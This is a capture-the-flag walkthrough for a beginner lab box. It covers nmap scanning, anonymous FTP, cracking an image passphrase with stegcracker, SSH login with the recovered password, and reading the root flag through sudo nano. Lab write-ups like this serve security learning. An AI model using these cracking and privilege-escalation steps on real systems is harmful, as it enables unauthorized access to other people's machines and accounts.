# Brooklyn

This room is aimed for beginner level hackers but anyone can try to hack this box.  
There are two main intended ways to root the box.  


# Tasks
- Read the User and root flag.  

# nmap

## ip = `10.10.36.221`

## Command 
```sh

 nmap -sV -sC -A -v 10.10.36.221 |tee nmap.txt
```
## Results
```sh
PORT STATE SERVICE VERSION
21/tcp open ftp vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_-rw-r--r-- 1 0 0
119 May 17 2020 note_to_jake.txt
| ftp-syst:
| STAT:
| FTP server status:
| Connected to ::ffff:10.8.172.59
| Logged in as ftp
| TYPE: ASCII
| No session bandwidth limit
| Session timeout in seconds is 300
| Control connection is plain text
| Data connections will be plain text
| At session startup, client count was 2
| vsFTPd 3.0.3 - secure, fast, stable
|_End of status
22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
| 2048 16:7f:2f:fe:0f:ba:98:77:7d:6d:3e:b6:25:72:c6:a3 (RSA)
| 256 2e:3b:61:59:4b:c4:29:b5:e8:58:39:6f:6f:e9:9b:ee (ECDSA)
|_ 256 ab:16:2e:79:20:3c:9b:0a:01:9c:8c:44:26:01:58:04 (ED25519)
80/tcp open http Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
| http-methods:
|_ Supported Methods: POST OPTIONS HEAD GET
|_http-title: Site does not have a title (text/html).
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
```

# ftp_21
Has `anonymous` log in allowed and has a text file in it.  
 ![[Pasted image 20241028190143.png]]
 
## Details
![[Pasted image 20241028190158.png]]

Two users  
- `Jake` = has a weak password  
- `holt` =Looks like he has some privileges   

# http_80

## To Do list
- visit he site
- View the source code
- visit robots.txt
- run gobuster

The site has an image and the source code tells us something to do with stenography.  
**![[Pasted image 20241028190218.png]]

Download the image.  
Use the following command to crack the image passphrase.  
```sh
stegcracker brooklyn99.jpg /usr/share/wordlists/rockyou.txt 
```
![[Pasted image 20241028190340.png]]

From This we get  
![[Pasted image 20241028190400.png]]

- user = `holt`
- password = `fluffydog12@ninenine`

# ssh_22

## Details

- users = `jake` and `holt`
- port 22 open
- Password for `holt` = `fluffydog12@ninenine`


Lets try ssh to holt using the following info

## ssh login
```sh
	ssh holt@10.10.36.221	
	#password = fluffydog12@ninenine
```
![[Pasted image 20241028190428.png]]

# Privilege Escalation

## To Do List
- sudo -l
- cat /etc/crontab
![[Pasted image 20241028190450.png]]
## sudo -l
We get that we can run `/bin/nano` with root privileges without a password.  
I will try to read the root flag since i have the flag name format from user .txt.  
```sh
 	sudo /bin/nano /root/root.txt
 ```
![[Pasted image 20241028190519.png]]
 